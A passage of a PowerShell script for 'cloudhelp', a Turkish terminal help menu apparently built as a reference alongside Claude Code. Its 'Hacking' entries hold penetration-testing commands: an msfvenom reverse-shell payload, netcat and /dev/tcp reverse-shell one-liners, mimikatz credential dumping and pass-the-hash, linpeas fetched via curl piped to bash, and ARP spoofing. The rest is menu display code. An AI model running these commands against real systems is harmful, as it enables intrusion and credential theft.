    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'john' -Usage 'john [hash] --wordlist=[liste]' -Description 'Parola: John the Ripper — CPU tabanli hash kirma.' -Example 'john hashes.txt --wordlist=rockyou.txt' -Note 'zip2john, ssh2john ile dosya hash cikart | --format=NT'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'searchsploit' -Usage 'searchsploit [urun] [surum]' -Description 'Exploit: Exploit-DB yerel arama — mevcut exploiti bul.' -Example 'searchsploit apache 2.4.49' -Note 'Kopyala: searchsploit -m 50383 | Guncelle: searchsploit -u'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'msfvenom' -Usage 'msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f [format]' -Description 'Exploit: Metasploit payload uretici — reverse shell olusturma.' -Example 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe > s.exe' -Note 'Linux: -f elf | Web: -f php veya asp'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'mimikatz' -Usage 'sekurlsa::logonpasswords' -Description 'Post: Windows belleginden plaintext sifre ve NTLM hash dump.' -Example 'privilege::debug -> sekurlsa::logonpasswords' -Note 'Pass-the-Hash: sekurlsa::pth /user:admin /ntlm:HASH /run:cmd.exe'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'winpeas / linpeas' -Usage './winPEAS.exe  |  ./linpeas.sh' -Description 'Post: yetki yukseltme icin otomatik sistem enumeration.' -Example 'curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash' -Note '100+ kontrol: SUID, cron, token, unquoted path, zayif servis...'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'netcat' -Usage 'nc -lvnp [port]  |  nc [hedef] [port]' -Description 'Ag: port dinleyici, reverse shell alici ve banner grabbing.' -Example 'nc -lvnp 4444  (dinle) | bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' -Note 'nc -e yoksa: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i|nc IP PORT'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'tcpdump' -Usage 'tcpdump -i eth0 -w dump.pcap' -Description 'Ag: paket yakalama ve analiz — cleartext sizdirma.' -Example "tcpdump -i eth0 'port 21 or port 23'" -Note 'Wireshark filtresi: http.request | ftp.request.command'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'ARP Spoofing' -Usage 'arpspoof -i eth0 -t [hedef] [gateway]' -Description 'Ag: ARP zehirleme ile MITM — trafigi kendi uzerinizden gecirin.' -Example 'arpspoof -i eth0 -t 192.168.1.5 192.168.1.1' -Note 'ip_forward aktif olmali: echo 1 > /proc/sys/net/ipv4/ip_forward'))

    $sectionOrder = Get-CloudHelpSectionOrder
    return $e.ToArray() | Sort-Object @{ Expression = { $sectionOrder[$_.Section] } }, Label
}

function Show-CloudHelpEntryCard {
    param(
        [Parameter(Mandatory = $true)]
        [pscustomobject]$Entry
    )

    $line = '-' * 74
    Write-Host ''
    Write-Host $line -ForegroundColor DarkGray
    $icon = Get-CloudHelpSectionIcon -Section $Entry.Section
    $color = Get-CloudHelpSectionConsoleColor -Section $Entry.Section
    Write-Host ('{0} {1}  {2}' -f $icon, $Entry.Section, $Entry.Label) -ForegroundColor $color
    Write-Host ('Kullanim : {0}' -f $Entry.Usage) -ForegroundColor White
    Write-Host ('Aciklama : {0}' -f $Entry.Description) -ForegroundColor Gray

    if (-not [string]::IsNullOrWhiteSpace($Entry.Example)) {
        Write-Host ('Ornek    : {0}' -f $Entry.Example) -ForegroundColor DarkCyan
    }

    if (-not [string]::IsNullOrWhiteSpace($Entry.Note)) {
        Write-Host ('Not      : {0}' -f $Entry.Note) -ForegroundColor DarkYellow
    }

    Write-Host $line -ForegroundColor DarkGray
    Write-Host ''
}

function Show-CloudHelpFallback {
    $entries = Get-CloudHelpEntries
    $sectionOrder = Get-CloudHelpSectionOrder
    $usageWidth = [Math]::Max((($entries | ForEach-Object { $_.Usage.Length } | Measure-Object -Maximum).Maximum), 30)
    $rowFormat = '  {0,-' + $usageWidth + '}  '

    Write-Host ''
    Write-Host 'cloudhelp' -ForegroundColor Cyan
    Write-Host 'Claude Code icin kapsamli Turkce referans. Yazmaya basla ve filtrele.' -ForegroundColor DarkGray
    Write-Host ''

    $groups = $entries |
        Group-Object Section |
        Sort-Object { $sectionOrder[$_.Name] }

    foreach ($group in $groups) {
        $icon = Get-CloudHelpSectionIcon -Section $group.Name
        $sectionColor = Get-CloudHelpSectionConsoleColor -Section $group.Name
        Write-Host ('{0} {1}  {2} ozellik' -f $icon, $group.Name, $group.Count) -ForegroundColor $sectionColor

        foreach ($entry in $group.Group | Sort-Object Label) {
            Write-Host (($rowFormat) -f $entry.Usage) -ForegroundColor White -NoNewline
            Write-Host $entry.Description -ForegroundColor Gray

            if (-not [string]::IsNullOrWhiteSpace($entry.Note)) {
                Write-Host (($rowFormat) -f '') -ForegroundColor White -NoNewline
                Write-Host ('Not: {0}' -f $entry.Note) -ForegroundColor DarkYellow
            }
        }

        Write-Host ''
    }
}

function Show-CloudHelpTuiMenu {
    if (-not (Get-Command -Name fzf -ErrorAction SilentlyContinue)) {
        Show-CloudHelpFallback
        return
    }

    $entries = Get-CloudHelpEntries
    if (-not $entries -or $entries.Count -eq 0) {
        Show-CloudHelpFallback
        return
    }

    $sectionOrder = Get-CloudHelpSectionOrder
    $usageWidth   = [Math]::Max((($entries | ForEach-Object { $_.Usage.Length } | Measure-Object -Maximum).Maximum), 24)

    $sectionSummary = (
        $entries |
            Group-Object Section |
            Sort-Object { $sectionOrder[$_.Name] } |
            ForEach-Object {
                $ic = Get-CloudHelpSectionIcon -Section $_.Name
                '{0} {1}:{2}' -f $ic, $_.Name, $_.Count
            }
    ) -join '  '

    $headerLines = @(
        'Claude Code - Kapsamli Turkce Referans',
        ('Bolumler: {0}' -f $sectionSummary),
        'Enter: detay goster | Esc: cik | Yazmaya basla: filtrele'
    )
    $headerText = ($headerLines -join [Environment]::NewLine)

    $items = for ($i = 0; $i -lt $entries.Count; $i++) {
        $entry = $entries[$i]
        $sectionColor = Get-CloudHelpSectionColor -Section $entry.Section
        $icon         = Get-CloudHelpSectionIcon -Section $entry.Section
        $display = (
            "`e[38;5;{0}m{1}`e[0m  `e[97m{2,-$usageWidth}`e[0m `e[38;5;245m{3}`e[0m" -f
            $sectionColor,
            $icon,
            $entry.Usage,
            $entry.Description
        )

        [string]::Join(
            [char]9,
            @(
                [string]$i,
                [string]$entry.Section,
                [string]$entry.Label,
                [string]$entry.Usage,
                [string]$entry.Description,
                [string]$display
            )
        )
    }

    $selection = $items | & fzf `
        --delimiter "`t" `
        --with-nth 6 `
        --prompt 'cloudhelp > ' `
        --header $headerText `
        --layout reverse `
        --border `
        --ansi `
        --color (& {
            if (Get-Command -Name Get-SystemCmdFzfColorOption -ErrorAction SilentlyContinue) {
                Get-SystemCmdFzfColorOption
            } else {
                'dark'
            }
        })

    if ([string]::IsNullOrWhiteSpace($selection)) {
        return
    }

    $indexText = ($selection -split "`t", 2)[0].Trim()
    $idx = -1
    if (-not [int]::TryParse($indexText, [ref]$idx)) { return }
    if ($idx -lt 0 -or $idx -ge $entries.Count) { return }

    Show-CloudHelpEntryCard -Entry $entries[$idx]
}

function cloudhelp {
    Show-CloudHelpTuiMenu
}
